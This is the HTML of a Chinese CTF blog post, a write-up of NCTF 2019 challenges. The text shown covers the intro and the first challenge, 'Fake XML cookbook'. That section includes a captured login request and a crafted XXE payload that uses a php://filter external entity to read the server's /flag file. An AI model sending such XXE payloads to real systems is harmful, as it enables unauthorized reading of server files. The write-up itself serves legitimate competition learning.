<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>NCTF 游记 | Eki&#39;s blog</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <undefined></undefined>
    <link rel="alternate" type="application/rss+xml" href="https://blog.ieki.xyz/rss.xml" title="Eki&#39;s blog RSS Feed">
    <link rel="alternate" type="application/atom+xml" href="https://blog.ieki.xyz/feed.atom" title="Eki&#39;s blog Atom Feed">
    <link rel="alternate" type="application/json" href="https://blog.ieki.xyz/feed.json" title="Eki&#39;s blog JSON Feed">
    <meta name="description" content="网络空间安全技术博客">
    <meta name="keywords" content="CTF,Pentest,网络空间安全">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.05e4719f.css" as="style"><link rel="preload" href="/assets/js/app.8153bfb8.js" as="script"><link rel="preload" href="/assets/js/2.236d623d.js" as="script"><link rel="preload" href="/assets/js/74.743857b6.js" as="script"><link rel="prefetch" href="/assets/js/10.46edbeee.js"><link rel="prefetch" href="/assets/js/100.6c7b5950.js"><link rel="prefetch" href="/assets/js/11.767adcb8.js"><link rel="prefetch" href="/assets/js/12.512cfd28.js"><link rel="prefetch" href="/assets/js/13.3a1a8df2.js"><link rel="prefetch" href="/assets/js/14.9af53798.js"><link rel="prefetch" href="/assets/js/15.ec2fb3eb.js"><link rel="prefetch" href="/assets/js/16.2a2ab730.js"><link rel="prefetch" href="/assets/js/17.f68cb202.js"><link rel="prefetch" href="/assets/js/18.63691748.js"><link rel="prefetch" href="/assets/js/19.c42e067a.js"><link rel="prefetch" href="/assets/js/20.d572d5a9.js"><link rel="prefetch" href="/assets/js/21.2adaf23d.js"><link rel="prefetch" href="/assets/js/22.ec130e8f.js"><link rel="prefetch" href="/assets/js/23.91dff6b1.js"><link rel="prefetch" href="/assets/js/24.e99440a5.js"><link rel="prefetch" href="/assets/js/25.c058aace.js"><link rel="prefetch" href="/assets/js/26.64c96eb1.js"><link rel="prefetch" href="/assets/js/27.dc5608c6.js"><link rel="prefetch" href="/assets/js/28.6485ffc0.js"><link rel="prefetch" href="/assets/js/29.853384e7.js"><link rel="prefetch" href="/assets/js/3.18b28bc3.js"><link rel="prefetch" href="/assets/js/30.5e8757c8.js"><link rel="prefetch" href="/assets/js/31.f620c04c.js"><link rel="prefetch" href="/assets/js/32.0b35c345.js"><link rel="prefetch" href="/assets/js/33.643f4002.js"><link rel="prefetch" href="/assets/js/34.17bda2ac.js"><link rel="prefetch" href="/assets/js/35.3194ffeb.js"><link rel="prefetch" href="/assets/js/36.7a864c05.js"><link rel="prefetch" href="/assets/js/37.ded9d5a1.js"><link rel="prefetch" href="/assets/js/38.e886837c.js"><link rel="prefetch" href="/assets/js/39.6fbcf82c.js"><link rel="prefetch" href="/assets/js/4.aa35785a.js"><link rel="prefetch" href="/assets/js/40.042825c7.js"><link rel="prefetch" href="/assets/js/41.be0e220a.js"><link rel="prefetch" href="/assets/js/42.16c54959.js"><link rel="prefetch" href="/assets/js/43.15487375.js"><link rel="prefetch" href="/assets/js/44.1bc3c0c9.js"><link rel="prefetch" href="/assets/js/45.4f713272.js"><link rel="prefetch" href="/assets/js/46.e09111f6.js"><link rel="prefetch" href="/assets/js/47.36f7aeac.js"><link rel="prefetch" href="/assets/js/48.f34dbf5d.js"><link rel="prefetch" href="/assets/js/49.736656d6.js"><link rel="prefetch" href="/assets/js/5.bf7c6b0f.js"><link rel="prefetch" href="/assets/js/50.198eeffb.js"><link rel="prefetch" href="/assets/js/51.97647028.js"><link rel="prefetch" href="/assets/js/52.c52a4607.js"><link rel="prefetch" href="/assets/js/53.7c2edc1a.js"><link rel="prefetch" href="/assets/js/54.fffca202.js"><link rel="prefetch" href="/assets/js/55.5ae50670.js"><link rel="prefetch" href="/assets/js/56.495068e5.js"><link rel="prefetch" href="/assets/js/57.a87d7435.js"><link rel="prefetch" href="/assets/js/58.67aa347c.js"><link rel="prefetch" href="/assets/js/59.df8d3736.js"><link rel="prefetch" href="/assets/js/6.3a52ecd1.js"><link rel="prefetch" href="/assets/js/60.dfcbd8de.js"><link rel="prefetch" href="/assets/js/61.c190617e.js"><link rel="prefetch" href="/assets/js/62.4cebd179.js"><link rel="prefetch" href="/assets/js/63.27f549f4.js"><link rel="prefetch" href="/assets/js/64.aa783284.js"><link rel="prefetch" href="/assets/js/65.5c153c60.js"><link rel="prefetch" href="/assets/js/66.57abb67a.js"><link rel="prefetch" href="/assets/js/67.3e60853d.js"><link rel="prefetch" href="/assets/js/68.fafb9569.js"><link rel="prefetch" href="/assets/js/69.bb71fbbe.js"><link rel="prefetch" href="/assets/js/7.ec46daa9.js"><link rel="prefetch" href="/assets/js/70.55a74c83.js"><link rel="prefetch" href="/assets/js/71.6edff065.js"><link rel="prefetch" href="/assets/js/72.2272d6b4.js"><link rel="prefetch" href="/assets/js/73.84a336f4.js"><link rel="prefetch" href="/assets/js/75.7afd7794.js"><link rel="prefetch" href="/assets/js/76.c69ff262.js"><link rel="prefetch" href="/assets/js/77.a3789c9d.js"><link rel="prefetch" href="/assets/js/78.0a082dca.js"><link rel="prefetch" href="/assets/js/79.ac794bd1.js"><link rel="prefetch" href="/assets/js/8.20733eb2.js"><link rel="prefetch" href="/assets/js/80.f346fded.js"><link rel="prefetch" href="/assets/js/81.1148a126.js"><link rel="prefetch" href="/assets/js/82.a0646f03.js"><link rel="prefetch" href="/assets/js/83.3f5285e3.js"><link rel="prefetch" href="/assets/js/84.0b41ad40.js"><link rel="prefetch" href="/assets/js/85.05acaff5.js"><link rel="prefetch" href="/assets/js/86.6332ed81.js"><link rel="prefetch" href="/assets/js/87.1e154849.js"><link rel="prefetch" href="/assets/js/88.ef9fe71b.js"><link rel="prefetch" href="/assets/js/89.644c6266.js"><link rel="prefetch" href="/assets/js/9.34ad444d.js"><link rel="prefetch" href="/assets/js/90.7a517ed7.js"><link rel="prefetch" href="/assets/js/91.724c1d33.js"><link rel="prefetch" href="/assets/js/92.c37e9d81.js"><link rel="prefetch" href="/assets/js/93.e6e1d6ba.js"><link rel="prefetch" href="/assets/js/94.bd88bff3.js"><link rel="prefetch" href="/assets/js/95.a64b5926.js"><link rel="prefetch" href="/assets/js/96.11700cb6.js"><link rel="prefetch" href="/assets/js/97.61fe23a4.js"><link rel="prefetch" href="/assets/js/98.0ae964e9.js"><link rel="prefetch" href="/assets/js/99.44a05c74.js">
    <link rel="stylesheet" href="/assets/css/0.styles.05e4719f.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Eki's blog" class="logo"> <span class="site-name can-hide">Eki's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/imgme.png"> <div class="blogger-info"><h3>Eki</h3> <span>Dreamer of Dreams</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>NCTF 游记</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/e69176/#_0x00-前言" class="sidebar-link">0x00 前言</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x01-fake-xml-cookbook" class="sidebar-link">0x01 Fake XML cookbook</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x02-true-xml-cookbook" class="sidebar-link">0x02 True XML cookbook</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x03-sqli-赛后复现" class="sidebar-link">0x03 SQLi (赛后复现)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x04-phar-matches-everything-赛后复现" class="sidebar-link">0x04 phar matches everything (赛后复现)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x05-easyphp" class="sidebar-link">0x05 easyphp</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x06-replace" class="sidebar-link">0x06 replace</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x07-flask" class="sidebar-link">0x07 flask</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x08-upload-your-shell" class="sidebar-link">0x08 Upload your Shell</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x09-flask-website" class="sidebar-link">0x09 flask_website</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x0a-simple-xss" class="sidebar-link">0x0A simple_xss</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x0b-hacker-backdoor" class="sidebar-link">0x0B hacker_backdoor</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x0c-tsb" class="sidebar-link">0x0C tsb</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x0d-难看的代码" class="sidebar-link">0x0D 难看的代码</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x0e-签到题" class="sidebar-link">0x0E 签到题</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x0f-debug" class="sidebar-link">0x0F DEBUG</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x10-our-16bit-games" class="sidebar-link">0x10 Our 16bit Games</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x11-easy-ternary" class="sidebar-link">0x11 Easy Ternary</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x12-你大概需要一个带bar的mac" class="sidebar-link">0x12 你大概需要一个带bar的mac</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x13-math-easy" class="sidebar-link">0x13 math_easy</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x14-hello-pwn" class="sidebar-link">0x14 hello_pwn</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x15-pwn-me-100-years-i" class="sidebar-link">0x15 pwn me 100 years! (I)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x16-pwn-me-100-years-ii" class="sidebar-link">0x16 pwn me 100 years! (II)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x17-0x1c-pwn" class="sidebar-link">0x17 ~ 0x1C(pwn)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x1d-keyboard" class="sidebar-link">0x1D Keyboard</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x1e-0x21-crypto" class="sidebar-link">0x1E~0x21 (Crypto)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x22-a-good-idea" class="sidebar-link">0x22 agoodidea</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x23-become-a-rockstar" class="sidebar-link">0x23 Become a Rockstar</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x24-bright-body-i" class="sidebar-link">0x24 Bright Body I</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x25-有内鬼-终止交易" class="sidebar-link">0x25 有内鬼,终止交易</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x26-小狗的秘密" class="sidebar-link">0x26 小狗的秘密</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x27-键盘侠" class="sidebar-link">0x27 键盘侠</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x28-what-s-this" class="sidebar-link">0x28 What's this</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x29-2077" class="sidebar-link">0x29 2077</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/e69176/#_0x2a-pip-install" class="sidebar-link">0x2A pip install</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><!----> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://ieki.xyz" target="_blank" title="作者" class="beLink" data-v-06225672>Eki</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2021-05-06</a></div> <div title="分类" class="date iconfont icon-wenjian" data-v-06225672><a href="/categories/?category=CTF" data-v-06225672>CTF </a><a href="/categories/?category=Contest" data-v-06225672>Contest </a></div></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">NCTF 游记<!----></h1>  <div class="theme-vdoing-content content__default"><h1 id="nctf-游记"><a href="#nctf-游记" class="header-anchor">#</a> NCTF 游记</h1> <h2 id="_0x00-前言"><a href="#_0x00-前言" class="header-anchor">#</a> 0x00 前言</h2> <p><img src="/assets/images/nctf2019.png" alt=""></p> <p>又是一场被大佬出的“入门新手基础水题”虐爆的比赛。。。。。。。</p> <p>pwn2和流量分析做的心态爆炸。。。。导致正常比赛下来都没做出啥题（其实是菜。。。。。。</p> <p>最终盗版战队止步前十。。。。天璇的其他大佬都好强啊！(群除我佬。。。。)</p> <p>收货：</p> <ul><li>XEE攻击基本方法</li> <li>linux 系统中一些敏感文件及其作用</li> <li>利用PIL写绘图脚本</li> <li>chr().拼接字符串绕过引号限制</li> <li>Wireshark 基本过滤操作的语法</li> <li>SSRF 攻击</li></ul> <p>Todo:</p> <ul><li>XXS 攻击的具体操作和原理</li> <li>PIE 保护情况下基址的泄露方法和64位按字节写入的操作。。。。。。。。</li> <li>一堆pwn的知识点 rop heap........</li> <li>Crypto密码学相关知识 RSA AES.......</li> <li>逆向patch.....</li></ul> <h2 id="_0x01-fake-xml-cookbook"><a href="#_0x01-fake-xml-cookbook" class="header-anchor">#</a> 0x01 Fake XML cookbook</h2> <p>F12看了一眼发现</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>function doLogin(){
	var username = $(&quot;#username&quot;).val();
	var password = $(&quot;#password&quot;).val();
	if(username == &quot;&quot; || password == &quot;&quot;){
		alert(&quot;Please enter the username and password!&quot;);
		return;
	}
	
	var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; 
    $.ajax({
        type: &quot;POST&quot;,
        url: &quot;doLogin.php&quot;,
        contentType: &quot;application/xml;charset=utf-8&quot;,
        data: data,
        dataType: &quot;xml&quot;,
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
        	if(code == &quot;0&quot;){
        		$(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
        	}else if(code == &quot;1&quot;){
        		$(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
        	}else{
        		$(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus);
        }
    }); 
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><p>用XML和服务器通讯，联想到XXE攻击</p> <p>burp抓post包得到</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /doLogin.php HTTP/1.1
Host: nctf2019.x1ct34m.com:40002
Content-Length: 207
Accept: application/xml, text/xml, */*; q=0.01
Origin: http://nctf2019.x1ct34m.com:40002
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
DNT: 1
Content-Type: application/xml;charset=UTF-8
Referer: http://nctf2019.x1ct34m.com:40003/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>根据js脚本可以发现username是可以回显的</p> <p>然后构造一下exp</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /doLogin.php HTTP/1.1
Host: nctf2019.x1ct34m.com:40002
Content-Length: 207
Accept: application/xml, text/xml, */*; q=0.01
Origin: http://nctf2019.x1ct34m.com:40002
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
DNT: 1
Content-Type: application/xml;charset=UTF-8
Referer: http://nctf2019.x1ct34m.com:40003/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [
 &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
 ]&gt;

&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
